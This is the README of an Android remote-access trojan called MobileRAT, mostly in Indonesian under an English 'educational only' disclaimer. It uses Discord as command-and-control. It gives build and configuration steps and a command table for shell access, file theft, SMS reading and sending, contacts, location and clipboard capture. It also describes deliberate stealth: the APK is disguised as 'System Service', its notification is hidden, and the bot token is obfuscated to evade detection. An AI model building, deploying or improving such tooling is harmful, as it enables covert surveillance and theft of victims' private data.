# MobileRAT

> ## ⚠️ EDUCATIONAL PURPOSE ONLY — READ BEFORE USE
>
> This repository is published **strictly for educational, research, and defensive-security purposes**.
> It is a learning artifact for studying how Android remote-access tooling, Discord-based command-and-control,
> foreground services, runtime permissions, scoped storage, and APK signing behave on real Android devices.
>
> - **Do NOT deploy, install, or run this software on any device you do not own or have explicit written authorization to test.**
> - **Do NOT use it to access, monitor, or control third-party devices, accounts, or data.**
> - **Do NOT redistribute compiled artifacts (APK) with the intent of unauthorized surveillance.**
> - Unauthorized use may violate computer-fraud, privacy, and telecommunications laws in your jurisdiction.
> - The author assumes **no liability** for misuse. You are solely responsible for your actions.
>
> If you are a defender: use this to understand attacker TTPs, build detections, and harden mobile endpoints.
> If you are a student: use it in an isolated lab you control, with consent, and never against production systems.
>
> **By cloning or using this code you agree to use it only in lawful, authorized, educational contexts.**

---

# MobileRAT

Android C2 lewat Discord. Package `com.kai.mobilerat`. **Alias `b`** — payload
PC pakai `a`, jadi dua-duanya bisa hidup di channel yang sama tanpa saling
tabrak.

Status: **build jalan, APK signed, terverifikasi statis.** Belum pernah
dijalankan di perangkat — lihat bagian *Yang belum dites*.

---

## Struktur

```
MobileRAT/
├── app/src/main/AndroidManifest.xml        permission, service, receiver
├── app/src/main/java/com/kai/mobilerat/
│   ├── Config.kt      <- DIHASILKAN tools/genconfig.py, jangan diedit tangan
│   ├── Vault.kt       <- buka blob config (SHA-256 stream + XOR)
│   ├── C2Service.kt   <- foreground service, poll, dispatch perintah
│   ├── Discord.kt     <- HTTP: 429 retry, upload multipart, download
│   ├── Perms.kt       <- permission runtime
│   ├── Vfs.kt         <- resolusi path /sdcard vs folder privat
│   ├── MainActivity.kt<- minta permission, battery exemption, start service
│   └── BootReceiver.kt<- autostart BOOT_COMPLETED
├── app/build.gradle
├── mobilerat.jks           (tidak masuk repo)
├── keystore.properties     (tidak masuk repo)
├── tools/
│   ├── genconfig.py   <- tulis Config.kt terenkripsi + uuid baru
│   ├── genkey.ps1     <- buat keystore signing
│   ├── genicon.py     <- ikon launcher per densitas
│   └── build.ps1      <- build + verifikasi tanda tangan (+ -Install)
├── dist/SystemService.apk  <- hasil build.ps1
└── legacy/                 <- file versi lama, disimpan apa adanya
```

## Build

`Config.kt` **tidak ada di repo** — sengaja. Isinya blob token Discord; kalau
di-commit, siapa pun yang meng-clone bisa membukanya dan memakai bot-nya.
Buat dulu sebelum build:

```powershell
python tools\genconfig.py --token "<token bot>" --channel <channel id> --alias b
```

Skrip itu menulis `app\src\main\java\com\kai\mobilerat\Config.kt` (sudah
di-`.gitignore`) sekaligus menolak selesai kalau token masih muncul plaintext.

Lalu:

```powershell
.\tools\build.ps1            # assembleRelease + verifikasi tanda tangan
.\tools\build.ps1 -Install   # sekalian adb install -r
.\tools\build.ps1 -Clean     # clean dulu
```

Kalau `assembleRelease` gagal dengan *"Failed to delete some children"* di
folder `~\.gradle\caches\9.6.0\transforms`, itu Android Studio yang memegang
handle file cache. Tutup Studio (atau `gradle --stop`) lalu ulangi.

Manual, kalau tidak mau lewat skrip:

```powershell
$env:JAVA_HOME = 'G:\Java2'
& "$env:USERPROFILE\.gradle\wrapper\dists\gradle-9.6.0-bin\42k10rwplmzkhuboz9kdazi7s\gradle-9.6.0\bin\gradle.bat" assembleRelease
```

Toolchain yang dipakai dan sudah terbukti: Gradle 9.6.0, AGP 9.5.0, JDK 25
(`G:\Java2`), compileSdk 37, build-tools 36.0.0, targetSdk 29, minSdk 24.

**AGP 9 tidak lagi butuh plugin Kotlin.** Menambahkan
`org.jetbrains.kotlin.android` membuat build langsung gagal dengan
*"The 'org.jetbrains.kotlin.android' plugin is no longer required for Kotlin
support since AGP 9.0"*. Itu yang bikin folder ini sebelumnya tidak bisa
di-build dari CLI.

## Ganti token / uuid / alias

```powershell
python tools\genconfig.py --token "<token>" --channel <id> --alias b
```

UUID dibuat acak kalau tidak diberi `--uuid`. Skrip menolak menyelesaikan
pekerjaan kalau token masih muncul plaintext di `Config.kt`.

Kunci dan blob ikut di dalam APK — ini bukan kriptografi, cuma mematikan
pencocokan regex token Discord. R8 mengecilkan dan mengganti nama kelas, jadi
string utuh `MTU2NDIx...` tidak ada di APK. Sudah diverifikasi dengan membongkar
`classes.dex`.

## Perintah

Semua butuh prefix: `!b <cmd>`, `b <cmd>`, `!<uuid> <cmd>`, atau `!* <cmd>`.
Tanpa prefix diabaikan diam-diam — versi lama menjawab `UNKNOWN` ke setiap
obrolan di channel.

| perintah | keterangan |
|---|---|
| `info` | model, sdk, cwd, baterai, status storage, jumlah permission kurang |
| `help` | daftar perintah |
| `sh <cmd>` | shell, jalan sebagai uid aplikasi (bukan root) |
| `cd <path>` / `ls [path]` | navigasi folder |
| `dl <path>` | unggah file sebagai **attachment** |
| `up <path>` | kirim perintah + lampiran → tersimpan di path |
| `gh <url> [dest]` | unduh dari URL |
| `shot` | screencap → attachment, atau lapor error aslinya |
| `clip [teks]` | baca / tulis clipboard |
| `ps` / `kill <pid\|package>` | proses |
| `msg <teks>` | toast di layar |
| `loc` | lokasi terakhir (GPS atau network) |
| `sms <nomor>\|<teks>` / `smsread` | SMS |
| `contacts` / `apps` | kontak / daftar aplikasi |
| `ip [pub]` | IP lokal (atau publik dengan `pub`) |
| `storage` / `battery` | kapasitas / baterai + status optimasi |
| `perm` | permission mana yang belum diberikan |
| `boot on\|off` | nyalakan/matikan autostart |
| `rm` / `mv` | hapus / pindah file |
| `sleep <detik>` | jeda polling (1–3600) |
| `exit` / `purge` | mati / hapus data aplikasi |

## Yang diperbaiki dari versi Kilo

| masalah | akibat | perbaikan |
|---|---|---|
| tidak ada `signingConfigs` | `assembleRelease` menghasilkan APK unsigned, Android menolak pasang | `tools/genkey.ps1` + `keystore.properties`, verified **v2 scheme true** |
| `foregroundServiceType="dataSync"` tanpa `FOREGROUND_SERVICE_DATA_SYNC` | `startForeground` melempar SecurityException di Android 14+ | permission didaftarkan + `ServiceCompat.startForeground` |
| permission runtime tidak pernah diminta | `smsread`, `contacts`, `loc` gagal SecurityException | `MainActivity` minta 7–8 permission, `Perms` cek sebelum akses |
| `dl` base64 ke dalam pesan | file 2 MB ≈ 2.700 pesan → rate limit | upload multipart, panjang body dihitung di depan |
| 429 tidak dihormati | bot kena limit makin lama | `retry_after` dibaca dari body, retry maksimal 4× |
| satu `try` membungkus seluruh batch | satu perintah gagal, sisa antrean hilang | `try/catch` **per pesan** |
| tanpa `res/`, tanpa `settings.gradle` | bukan proyek Gradle, tidak bisa build | struktur `app/` standar + ikon per densitas |
| `Config.kt` token plaintext | satu regex token langsung kena | blob XOR+SHA-256, decode saat runtime |
| `targetSdk 37` | restriction baru tanpa manfaat | `targetSdk 29` + `requestLegacyExternalStorage` |
| `purge` hapus `dataDir` sendiri | nggak ngefek | `clearApplicationUserData()` |
| `cd` tidak validasi | cwd bisa menunjuk path mati | validasi `isDirectory` |
| tidak ada `boot on/off` | autostart tidak bisa dicabut | `setComponentEnabledSetting` |
| `shot` lapor path padahal gagal | false positive | file diperiksa, error asli dikirim |

## Batas yang harus diketahui

**Notifikasi permanen.** Foreground service wajib menampilkan notifikasi.
Sudah diset `IMPORTANCE_MIN` + `VISIBILITY_SECRET`, jadi tidak ada ikon di
status bar dan tidak muncul di lock screen, tapi tetap ada di shade kalau
dibuka. Menghilangkannya butuh root.

**`targetSdk 29`.** Sengaja. Di atas 30, `/sdcard` terkunci scoped storage dan
semua perintah file jadi kosong kecuali pengguna memberi "All files access".
Android 14 hanya menolak memasang aplikasi dengan targetSdk di bawah 23, jadi 29
masih bisa dipasang di versi terbaru.

**`shot` sering gagal.** `screencap` dijalankan sebagai uid aplikasi, bukan
shell, dan sejak Android 8 butuh `READ_FRAME_BUFFER` yang hanya milik sistem.
Screenshot yang benar-benar jalan pakai `MediaProjection` — dan itu wajib
memunculkan dialog persetujuan pengguna setiap sesi. Trade-off-nya: screenshot
beneran vs tidak kelihatan. Versi ini memilih yang kedua, dan melaporkan
kegagalan apa adanya.

**Dialog permission di awal.** Saat APK pertama dibuka, muncul dialog izin
SMS/kontak/lokasi dan permintaan "ignore battery optimization". Itu tidak bisa
dihilangkan tanpa root. Kalau pengguna menolak, aplikasi tetap jalan tapi
`smsread`/`contacts`/`loc` balas `ERR PERM ...`.

**Doze.** Sudah minta exemption, tapi ROM Cina (MIUI, ColorOS) tetap bisa
membunuh service. Tidak ada obat tanpa autostart permission vendor.

**Channel yang sama dengan payload PC.** Alias `b` memisahkan perintah, tapi
balasan PC (`[a] ...`) dan HP (`[b] ...`) masuk ke channel yang sama. Kalau
mau benar-benar terpisah, buat bot kedua.

## Yang sudah dan belum dites

Sudah terpasang dan dijalankan di perangkat nyata: **SM-X910N, Android 9, SDK 28**
lewat `adb`. Hasil:

```
pm install                      Success
dumpsys activity services        ServiceRecord com.kai.mobilerat/.C2Service
                                 isForeground=true foregroundId=1
                                 foregroundServiceType aktif (dataSync)
ps -A | grep mobilerat            proses hidup, tidak crash
pm grant (7 permission)          granted
```

Dari uji itu ketemu bug yang tidak mungkin kelihatan tanpa menjalankan:
`Vault.open()` menge-hash **teks base64** kuncinya, sementara
`tools/genconfig.py` menge-hash **byte mentahnya**. Seed berbeda → blob
ter-decode jadi sampah → token salah → setiap panggilan Discord 401 → service
hidup tapi diam selamanya, tanpa satu pun exception di logcat. Sudah diperbaiki
di commit ini.

Terverifikasi statis:

```
apksigner verify --print-certs
  DN: CN=System Service, OU=Update, O=System, L=Jakarta, C=ID
  SHA-256: ca1ad3a47d783587a15ae430514ce493cf084b781295e5d3a3ab839692be1d4e
  Verified using v2 scheme (APK Signature Scheme v2): true

aapt2 dump badging
  package com.kai.mobilerat v1.1  minSdk 24  targetSdk 29
  label 'System Service'  foregroundServiceType=0x1 (dataSync)

classes.dex
  C2Service / BootReceiver / MainActivity utuh (tidak ter-obfuscate)
  token plaintext: tidak ada
```

Belum terbukti: service hidup setelah reboot, upload attachment di jaringan
seluler, dan `screencap` (di Android 9 `screencap` sebagai uid aplikasi tetap
gagal karena butuh `READ_FRAME_BUFFER`; itu batas OS, bukan bug kode).

## Riwayat

- `legacy/` berisi `C2Service.kt`, `Config.kt`, `MainActivity.kt`,
  `BootReceiver.kt`, `AndroidManifest.xml`, `build.gradle` versi Kilo —
  disimpan tanpa diubah untuk pembanding.
